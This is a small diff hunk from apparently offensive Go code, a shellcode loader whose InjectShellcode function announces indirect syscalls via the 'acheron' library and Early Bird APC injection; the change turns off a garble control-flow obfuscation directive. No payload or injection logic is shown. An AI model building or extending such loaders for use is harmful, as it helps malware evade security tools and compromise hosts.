@@ -23,7 +23,7 @@ func Init() (*ShellcodeLoader, error) {
 	return &ShellcodeLoader{Acheron: ach}, nil
 }
 
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) error {
 	fmt.Printf("[!] Using indirect syscalls with acheron (Early Bird APC)...\n")
 
